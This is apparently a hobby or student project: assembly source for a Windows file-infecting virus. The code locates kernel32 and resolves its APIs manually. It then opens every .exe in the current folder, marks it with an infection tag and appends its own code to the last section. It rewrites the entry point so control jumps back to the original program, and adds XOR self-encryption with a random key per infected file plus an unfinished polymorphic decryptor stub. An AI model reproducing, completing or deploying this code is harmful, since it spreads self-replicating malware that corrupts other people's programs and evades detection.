; msgbox.asm

.386
.model flat, stdcall
option casemap:none

      include windows.inc
	  include kernel32.inc

      includelib user32.lib
      includelib kernel32.lib

.data


.code

APPLYXORVALUE	macro addrbegin, addrend, value

	push esi
	push ecx	
	push eax

	mov esi, addrbegin

	mov ecx, addrend
	sub ecx, addrbegin
	
	xor eax, eax

	.WHILE ecx > 0
		
		mov al, byte ptr [esi]
		xor eax, value
		mov byte ptr [esi], al

		inc esi
		dec ecx
	.ENDW

	pop eax
	pop ecx
	pop esi
				endm

GETLABELOFFSET	macro labelBegin, labelEnd, dest
	mov esi, labelEnd
	sub esi, labelBegin
	mov dest, esi
				endm


main:
	mov ebx, [esp]
	jmp crypted_code_end

applyxorvalue	proc addrbegin:dword, addrend:dword, value:dword

	uncryptor_buffer db 75 DUP(90h)
	;; ^ cree un buffer de xx octets avec l'instruction Nop
	pusha


	xor eax, eax
	mov esi, addrbegin
	mov edi, addrbegin
	mov ecx, addrend
	sub ecx, addrbegin

xorloop:
	lodsb
	xor eax, value
	stosb
	loop xorloop



	popa

	ret
applyxorvalue	endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;
;;; CRYPTED CODE STARTS HERE
;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
crypted_code_begin:
;; "global variables", but our section needs the write attribute in order for this to work
;; post-build event takes care of that
	procGetSystemTime dd 0h

getrandomnumber proc maxval:dword
	push ebx
	push ecx
	push edx
	sub esp, sizeof(SYSTEMTIME) ;; structure buffer
	
	xor eax, eax
	mov ebx, esp
	push ebx
	call procGetSystemTime
	xor edx, edx
	xor eax, eax
	mov ecx, maxval

	assume ebx:ptr SYSTEMTIME
	mov ax, [ebx].wMilliseconds
	assume ebx:nothing

	;shl eax, 010h		; last two bytes are now 0
	mov ebx, esp		; we add some randomness: take current esp value
	xor ebx, ebp		; just do some random stuff
	and ebx, 0FFFFh		; consider the last two bytes
	shl ebx, 010h
	add eax, ebx		; add them to eax

	div ecx

	mov eax, edx

	add esp, sizeof(SYSTEMTIME) ;; clean structure buffer
	pop edx
	pop ecx
	pop ebx
	ret
getrandomnumber endp

decryptorGenerator proc ;decryptoraddr:dword, decryptorvalue:dword, cryptaddrbegin:dword, cryptaddrend:dword

	jmp startgen

	__ValueReg		db	0FFh
	__CrptBegReg	db	0FFh
	__CrptSizeReg	db	0FFh

	;; This is a 15bytes (true size to be determined) code buffer holding NOPs for now.
	decryptoraddr db 15 DUP(090h)

	;; this is where the code for each part of the XORer is stored.
	;; push the adresses on the stack, then swap them randomly, and finally write them
	;; to the xorer

	__MoveValue	db 0B8h
	__MoveBeg	db 0B8h
	__MoveSize	db 0B8h



startgen:
	mov edi, offset decryptoraddr
	invoke getrandomnumber, 04h
	mov byte ptr [__ValueReg]	, al	; stores the chosen register in __ValueReg
	mov byte ptr [__CrptBegReg]	, al	; for the sake of following while loop
	mov byte ptr [__CrptSizeReg], al	; same

	;; mov <reg32>, crypt_key
	or al, 0B8h	  ; mov <reg32>,
	stosb
	mov eax, 044h ; crypt_key
	stosd


;
;	.while __ValueReg ;== __CrptBegReg ; can't let you do that starfox, one of those has to be a register
;		invoke getrandomnumber, 04h
;		mov byte ptr [__CrptBegReg], al
;	.endw



	mov al, 0C3h ; ret
	stosb

	mov eax, offset decryptoraddr
	call eax

	ret
decryptorGenerator endp

loadproc	macro dest, hmodule, loadproc, strproc
	push eax
	
	push strproc
	push hmodule
	call loadproc
	mov dest, eax
	
	pop eax
			endm
loadprocoff macro dest, hmodule, loadproc, delta, delta_offset
	
	push eax
	push ebx

	mov eax, delta
	add eax, delta_offset
	push eax
	push hmodule
	call loadproc
	mov dest, eax

	pop ebx
	pop eax

			endm

movloc	macro	dest, src

	push edi

	mov edi, src
	mov dest, edi
	
	pop edi

		endm

addloc macro	dest, src

	push edi

	mov edi, dest
	add edi, src
	mov dest, edi
	
	pop edi

	   endm



extractKernel32PEHeader proc delta:dword

	and delta, 0FFFF0000h
l1:
	sub delta, 1000h
	mov ecx, [delta]
	cmp word ptr [ecx], "ZM"
	jne l1

	mov eax, [ecx + 3Ch]
	cmp word ptr [eax + ecx], "EP"
	je return
	xor eax, eax
	ret

return:
	add eax, ecx
	ret
extractKernel32PEHeader endp


getPEBaseAddr proc PEAddr:dword
	
	mov ebx, PEAddr
	add ebx, 18h ;; offset to IMAGE_OPTIONAL_HEADER
	assume ebx:ptr IMAGE_OPTIONAL_HEADER
	mov eax, [ebx].ImageBase
	assume ebx:nothing
	ret
getPEBaseAddr endp

getExportedProcAddr proc PEHeader:dword, PEBaseAddr:dword, ProcName:dword, ProcNameSize:dword
	local exportSectionVAddr:dword
	local numberOfFunctions:dword
	local exportDirectoryAddr:dword
	local funcIndex:dword
	local ordinalsAddr:dword
	local funcsAddr:dword

	mov ebx, PEHeader
	add ebx, 18h				;; Optional header
	add ebx, 60h				;; IMAGE_DATA_DIRECTORY[0]
	

	assume ebx:ptr IMAGE_DATA_DIRECTORY
	movloc exportSectionVAddr, [ebx].VirtualAddress
	assume ebx:nothing
	mov exportDirectoryAddr, ebx
	xor ebx, ebx

	mov eax, exportDirectoryAddr
	mov eax, [eax]				;; IMAGE_EXPORT_DIRECTORY relative virtual address
	add eax, PEBaseAddr			;; IMAGE_EXPORT_DIRECTORY true address

	mov funcIndex, 0
	assume eax:ptr IMAGE_EXPORT_DIRECTORY
	movloc numberOfFunctions, [eax].NumberOfNames
	movloc ordinalsAddr, [eax].AddressOfNameOrdinals	;; relative address
	movloc funcsAddr, [eax].AddressOfFunctions			;; relative address
	addloc funcsAddr, PEBaseAddr						;; true address
	mov ebx, [eax].AddressOfNames
	add ebx, PEBaseAddr				;; pointer to first name
	mov edx, numberOfFunctions
	addloc ordinalsAddr, PEBaseAddr						;; true address
	.WHILE funcIndex < edx
		.IF funcIndex == 0244h
			push 0
			add esp,4
		.ENDIF
		
		mov esi, [ebx]
		add esi, PEBaseAddr
		mov edi, ProcName
		mov ecx, ProcNameSize
		cld
		repe cmpsb
		je endfindproc

		inc funcIndex
		add ebx, sizeof dword		;; go to next pointer to name
	.ENDW
	jmp endfindprocfail

endfindproc:

	assume eax:nothing
	mov		edx,			funcIndex		;; edx iterations

	shl		edx,			1				;; ordinals are on 2 bytes, so in term of memory : iterations * 2
	add		edx,			ordinalsAddr	;; directly reach correct ordinal
	xor		eax,			eax
	mov		ax,	word ptr	[edx]			;; store func ordinal in ax
	shl		eax,			2				;; ordinal is an index for a 4 bytes value, so a direct memory offset is at : ordinal * 4
	add		eax,			funcsAddr		;; direct access to function's RVA
	mov		ebx,			[eax]			;; store function's RVA
	add		ebx,			PEBaseAddr		;; function's real address
	mov		eax,			ebx


endfindprocfail:
	ret
getExportedProcAddr endp

postMappingOperations proc pointerToInfectionCode:dword
	local iXorValue:dword
	local offsetCryptedCode:dword
	local cryptedCodeBegin:dword
	local cryptedCodeEnd:dword

	push eax
	push ebx

	;; First, we change the XOR value so it's (almost) never the same for 2 infected binaries
	;; We get the offset between our main label and the xor value in our code
	
	mov ebx, pointerToInfectionCode
	mov eax, crypt_key_value
	sub eax, main						;; eax now holds the offset to crypt_key_value in terms of code

	add ebx, eax						;; ebx now has the address of crypt_key_value in the infected file
	invoke getrandomnumber, 0FFFFFFFFh
	mov byte ptr[ebx], al					
	and eax, 0FFh
	mov iXorValue, eax

	GETLABELOFFSET main, crypted_code_begin, offsetCryptedCode
	movloc cryptedCodeBegin, pointerToInfectionCode
	addloc cryptedCodeBegin, offsetCryptedCode

	GETLABELOFFSET main, crypted_code_end, offsetCryptedCode
	movloc cryptedCodeEnd, pointerToInfectionCode
	addloc cryptedCodeEnd, offsetCryptedCode

	APPLYXORVALUE cryptedCodeBegin, cryptedCodeEnd, iXorValue
	;; now, we XOR the part of the file which holds our code, using the new xor key

	
	pop ebx
	pop eax
	ret
postMappingOperations endp

testproc proc

	push 0h
blah:pop eax
	
	mov edx, 0h
	mov edx, 0h
	bleh:mov edx, 0h
	;;mov eax, uncryptor_buffer



	ret

testproc endp


filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword, codeSize:dword
	local findFileData:WIN32_FIND_DATA
	local searchHandle:dword
	local fileHandle:dword
	local fileMapping:dword
	local fileView:dword
	local originalEntryPoint:dword
	local newSectionStart:dword
	local virtualSectionStart:dword
	local localdelta:dword

	local prcFindFirstFile:dword
	local prcFindNextFile:dword
	local prcFindClose:dword
	local prcCreateFile:dword
	local prcCreateFileMapping:dword
	local prcMapViewOfFile:dword
	local prcUnmapViewOfFile:dword
	local prcCloseHandle:dword

	;jmp filesLoopInit
	call filesLoopInit

	; As a side note, Jambi is started in our /trunk/jambi/ so add an exe there if you want this to work
	PatternStr				db "*.exe",0				; size = 06h, offset = 00h
	strFindFirstFile		db "FindFirstFileA",0		; size = 0fh, offset = 06h
	strFindNextFile			db "FindNextFileA",0		; size = 0eh, offset = 15h
	strFindClose			db "FindClose",0			; size = 0ah,
	strCreateFile			db "CreateFileA",0			; size = ,
	strCreateFileMapping	db "CreateFileMappingA",0	; size = ,
	strMapViewOfFile		db "MapViewOfFile",0		; size = ,
	strUnmapViewOfFile		db "UnmapViewOfFile",0		; size = ,
	strCloseHandle			db "CloseHandle",0			; size = ,
	strGetSystemTime		db "GetSystemTime",0

filesLoopInit:

	mov esi, dword ptr [esp]
	mov localdelta, esi
	;movloc localdelta, [esp]

	;;loadprocoff prcFindFirstFile, k32hmodule, prcGetProcAddr, localdelta, 06h
	loadproc prcFindFirstFile,		k32hmodule, prcGetProcAddr, offset strFindFirstFile
	loadproc prcFindNextFile,		k32hmodule, prcGetProcAddr, offset strFindNextFile
	loadproc prcFindClose,			k32hmodule, prcGetProcAddr, offset strFindClose
	loadproc prcCreateFile,			k32hmodule, prcGetProcAddr, offset strCreateFile
	loadproc prcCreateFileMapping,	k32hmodule, prcGetProcAddr, offset strCreateFileMapping
	loadproc prcMapViewOfFile,		k32hmodule, prcGetProcAddr, offset strMapViewOfFile
	loadproc prcUnmapViewOfFile,	k32hmodule, prcGetProcAddr, offset strUnmapViewOfFile
	loadproc prcCloseHandle,		k32hmodule, prcGetProcAddr, offset strCloseHandle
	

	mov esi, offset procGetSystemTime
	loadproc ebx, k32hmodule, prcGetProcAddr, offset strGetSystemTime
	mov dword ptr[esi], ebx

	invoke decryptorGenerator

	;invoke FindFirstFile, offset PatternStr, addr findFileData
	lea edi, findFileData
	push edi
	push offset PatternStr
	call prcFindFirstFile

	cmp eax, INVALID_HANDLE_VALUE
	je filesFinished ; we are fucked
	mov searchHandle, eax
	
fileMainLoop:
	
	;invoke prcCreateFile, addr findFileData.cFileName, GENERIC_READ or GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0
	lea edi, findFileData.cFileName
	push 0
	push 0
	push OPEN_EXISTING
	push 0
	push 0
	push GENERIC_READ or GENERIC_WRITE
	push edi
	call prcCreateFile

	cmp eax, INVALID_HANDLE_VALUE
	je fileNext
	mov fileHandle, eax

	mov edx, findFileData.nFileSizeLow
	add edx, sectionSize ; edx now had our total fileSize
	

	;invoke prcCreateFileMapping, fileHandle, 0, PAGE_READWRITE, 0, 0, 0 ; This is where we have to change the size of our program.
	push 0
	push edx
	push 0
	push PAGE_READWRITE
	push 0
	push fileHandle
	call prcCreateFileMapping

	cmp eax, 0
	je fileClose
	mov fileMapping, eax


	;invoke prcMapViewOfFile, fileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
	push 0
	push 0
	push 0
	push FILE_MAP_ALL_ACCESS
	push fileMapping
	call prcMapViewOfFile
	cmp eax, 0
	je fileMapClose
	mov fileView, eax
	; fileView now points toward an array representing our file

	; SCRAT CODE

	assume eax: ptr IMAGE_DOS_HEADER
	.if [eax].e_magic != IMAGE_DOS_SIGNATURE
		jmp fileMapViewClose
	.endif
	add eax, [eax].e_lfanew

	assume eax: ptr IMAGE_NT_HEADERS
	.if [eax].Signature != IMAGE_NT_SIGNATURE
		jmp fileMapViewClose
	.endif
	mov ebx, eax
	; ENDFIXME

; --------------------------------------------------------------------------------------------------

	; jump the PE headers (IMAGE_NT_HEADERS)
	add eax, sizeof IMAGE_NT_HEADERS

	; ebx == PE_HEADER, IMAGE_NT_HEADERS
	; eax == IMAGE_SECTION_HEADERS

	assume ebx: ptr IMAGE_NT_HEADERS

	; check for loadFlags field -> infected or not?
	.if [ebx].OptionalHeader.LoaderFlags == 46554342
		jmp fileMapViewClose
	.endif
	mov [ebx].OptionalHeader.LoaderFlags, 46554342


	; look for the last section, the last is the one with the biggest VirtualAddress
	; FIXME : placer a la fin de .code si possible?
	mov ecx, 0
	mov cx, [ebx].FileHeader.NumberOfSections

	assume eax: ptr IMAGE_SECTION_HEADER
	mov esi, 0
	.while ecx > 0
		.if [eax].VirtualAddress > esi
			mov esi, [eax].VirtualAddress
			mov edi, eax
		.endif
		dec ecx
		add eax, SIZEOF IMAGE_SECTION_HEADER
	.endw

	; edi == last section

; --------------------------------------------------------------------------------------------------

	; extend the general file size in the [ebx].FileHeader.SizeOfImage
;	mov ecx, [ebx].OptionalHeader.SizeOfImage
;	add ecx, 2048 + SIZEOF DWORD ; FIXME : sizeof payload + SIZEOF DWORD
;	mov edx, [ebx].OptionalHeader.SectionAlignment
;	memalign ecx, edx
;	mov [ebx].OptionalHeader.SizeOfImage, ecx

; --------------------------------------------------------------------------------------------------

	; save the entry point of the prg
	mov esi, [ebx].OptionalHeader.AddressOfEntryPoint
	mov originalEntryPoint, esi
;	add esi, [ebx].OptionalHeader.ImageBase

; --------------------------------------------------------------------------------------------------

	assume edi: ptr IMAGE_SECTION_HEADER
	; preparing to write the payload
	mov edx, fileView ; from the beginning of the mapped file
	add edx, [edi].PointerToRawData ; go to the section address
	add edx, [edi].SizeOfRawData ; go to the end of the section
	dec edx ; don't go to far

	; get to the right place
	mov ecx, edx
	.while byte ptr [edx] == 0 || byte ptr [edx] == 90h
		dec edx
	.endw
	sub ecx, edx ; compute the difference
	inc edx ; copy right after the code
	mov newSectionStart, edx

	; modifying the entry point of the prg, vadress
	mov eax, [edi].VirtualAddress ; the vadress of the section ; FIXME : align it
	add eax, [edi].SizeOfRawData ; the vadress of the end of the section
	sub eax, ecx
	mov [ebx].OptionalHeader.AddressOfEntryPoint, eax ; writing


	push esi
	push edi
	push ecx

	; copy the payload at the right place
	
	mov esi, main ;from the beginning of our code

	mov edi, newSectionStart

	cld
	mov ecx, codeSize ; copy sectionSize bytes
	rep movsb ;HOLY SH1T 1TS T34L

	pop ecx
	pop edi
	pop esi

	mov eax, newSectionStart
	add eax, codeSize ; go to the very end of what we copied.
	sub eax, 6 ; go back 6 bytes, which is ret and 5 nops
	; copy the real entry point adress
	mov byte ptr [eax], 0E9h ; E9h JMP, E8h CALL ; bug du compilo
	inc eax
	mov ecx, originalEntryPoint
	mov dword ptr [eax], ecx
	add [edi].Characteristics, IMAGE_SCN_MEM_EXECUTE
	; increase header size
	mov eax, sectionSize
	add [edi].SizeOfRawData, eax

	mov eax, codeSize
	add [ebx].OptionalHeader.SizeOfImage, eax
	add [edi].Misc.VirtualSize, eax

	; END SCRAT
	
	; TODO : change the XOR value (label: crypt_key_value)
	; XOR the content of fileview with the new value, between labels crypted_code_begin and crypted_code_end
	; treatment is done !

fileMapViewClose:
	push fileView
	call prcUnmapViewOfFile

fileMapClose:
	push fileMapping
	call prcCloseHandle

fileClose:
	push fileHandle
	call prcCloseHandle

fileNext:
	lea edi, findFileData
	push edi
	push searchHandle
	call prcFindNextFile

	cmp eax, 0
	jne fileMainLoop

fileNoMore:
	push searchHandle
	call prcFindClose

filesFinished:
	ret
filesLoop endp

beginInfection proc delta:dword
	local K32PEHeaderAddr:dword
	local K32BaseAddr:dword
	local procLoadLibrary:dword
	local procGetProcAddress:dword
	local procMessageBox:dword
	local localDelta:dword
	local hmodule:dword
	local fileAlignment:dword
	local sectionSize:dword
	local codeSize:dword

	jmp Kernel32Init

beginInfectionStr:
	LoadLibraryStr	db "LoadLibraryA",0		; localDelta + 0h
	GetProcAddrStr	db "GetProcAddress",0	; + 0Dh
	User32DllStr	db "User32.dll",0		; + 0Fh
	MessageBoxStr	db "MessageBoxA",0		; + 0Bh
	TitleStr		db "Done !",0			; + 0Ch
	Kernel32Dllstr	db "Kernel32.dll",0		; + 07h

Kernel32Init:
	mov eax, [esp]
	mov localDelta, beginInfectionStr
	invoke extractKernel32PEHeader, delta
	mov K32PEHeaderAddr, eax
	invoke getPEBaseAddr, K32PEHeaderAddr
	mov K32BaseAddr, eax



	invoke getExportedProcAddr, K32PEHeaderAddr, K32BaseAddr, localDelta, sizeof LoadLibraryStr
	mov procLoadLibrary, eax
	
	add localDelta, 0Dh
	invoke getExportedProcAddr, K32PEHeaderAddr, K32BaseAddr, localDelta, sizeof GetProcAddrStr
	mov procGetProcAddress, eax

	add localDelta, 0Fh
	push localDelta
	call procLoadLibrary
	mov hmodule, eax

	add localDelta, 0Bh
	push localDelta
	push hmodule
	call procGetProcAddress
	mov procMessageBox, eax

	add localDelta, 0Ch
	push MB_OK
	push localDelta
	push localDelta
	push 0
	call procMessageBox

	add localDelta, 07h
	push localDelta
	call procLoadLibrary

	push eax ;save eax

	mov fileAlignment, 01000h ;this should be set from the header data.
	mov eax, endfile
	sub eax, main ;we now have our total code size in eax
	mov codeSize, eax
	mov edx, 0
	idiv fileAlignment ; divide it by fileAlignment
	inc eax
	imul eax, fileAlignment ; now our codeSize is a multiple of FileAlignement
	mov sectionSize, eax

	pop eax ;restore eax

	invoke filesLoop, eax, procGetProcAddress, sectionSize, codeSize

	; TODO : this is were we add nasty stuff

	ret
beginInfection endp



startinf:

	xor eax, eax
	;invoke extractKernel32PEHeader, ebx
	;invoke testproc
	invoke beginInfection, ebx
	jmp final_return

crypted_code_end:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;
;;; CRYPTED CODE ENDS HERE
;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	jmp start_uncrypt
crypt_key_value:
	CKV db 00h	

start_uncrypt:

	;invoke applyxorvalue, offset crypted_code_begin, offset crypted_code_end, CKV
	jmp startinf
	
final_return:
	; making room for the very last jmp instruction ...
	nop ; JMP E9
	nop ; there goes the 32 bit adress we jump to
	nop	; sssh
	nop	; no tears
	nop	; only dreams now
	ret
endfile:
end	main
